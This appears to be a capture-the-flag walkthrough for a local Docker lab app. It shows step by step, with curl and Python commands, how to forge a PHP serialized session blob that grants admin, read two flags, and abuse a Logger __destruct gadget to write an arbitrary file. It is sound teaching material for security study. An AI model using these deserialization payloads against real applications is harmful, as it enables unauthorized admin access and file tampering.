# Walkthrough: PHP Deserialization

## Setup

```bash
docker compose up --build -d
```

## Step 1: Inspect a Legitimate Session Blob

Log in as alice and save the session:

```bash
CJAR=$(mktemp)
curl -s -c "$CJAR" -b "$CJAR" -X POST http://127.0.0.1:8092/login \
    -H "Content-Type: application/json" -d '{"username":"alice","password":"alice123"}'

SAVE=$(curl -s -c "$CJAR" -b "$CJAR" -X POST http://127.0.0.1:8092/session/save \
    -H "Content-Type: application/json" -d '{}')
BLOB=$(echo "$SAVE" | python3 -c "import json,sys; print(json.load(sys.stdin)['session_blob'])")
echo "$BLOB" | python3 -c "import base64,sys; print(base64.b64decode(sys.stdin.read()).decode())"
```

Output: `a:2:{s:4:"user";s:5:"alice";s:4:"role";s:4:"user";}`

This is a PHP serialized array. The `role` field is trusted by the restore endpoint.

## Step 2: Forge an Admin Session

```bash
rm -f "$CJAR"; CJAR=$(mktemp)
ADMIN_BLOB=$(python3 -c "
import base64
s = 'a:2:{s:4:\"user\";s:5:\"admin\";s:4:\"role\";s:5:\"admin\";}'
print(base64.b64encode(s.encode()).decode())
")
curl -s -c "$CJAR" -b "$CJAR" \
    -X POST http://127.0.0.1:8092/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$ADMIN_BLOB\"}"
```

Output: `{"message":"Session restored","user":"admin","role":"admin"}`

## Step 3: Get Flag 1

```bash
curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8092/profile
```

Output (flag 1 in `hint`): `{"hint":"POC{...}","role":"admin","username":"admin"}`

## Step 4: Get Flag 2

```bash
curl -s -c "$CJAR" -b "$CJAR" http://127.0.0.1:8092/admin/secret
```

Output: `{"secret":"POC{...}"}`

## Bonus: Logger.__destruct Gadget

```bash
LOGGER_BLOB=$(python3 -c "
import base64
s = 'O:6:\"Logger\":2:{s:7:\"logfile\";s:19:\"/tmp/gadget_out.txt\";s:7:\"message\";s:6:\"HACKED\";}'
print(base64.b64encode(s.encode()).decode())
")
curl -s -X POST http://127.0.0.1:8092/session/restore \
    -H "Content-Type: application/json" \
    -d "{\"session_blob\":\"$LOGGER_BLOB\"}"

docker exec php-deserialization_app_1 cat /tmp/gadget_out.txt
# HACKED
```

## Teardown

```bash
docker compose down
```
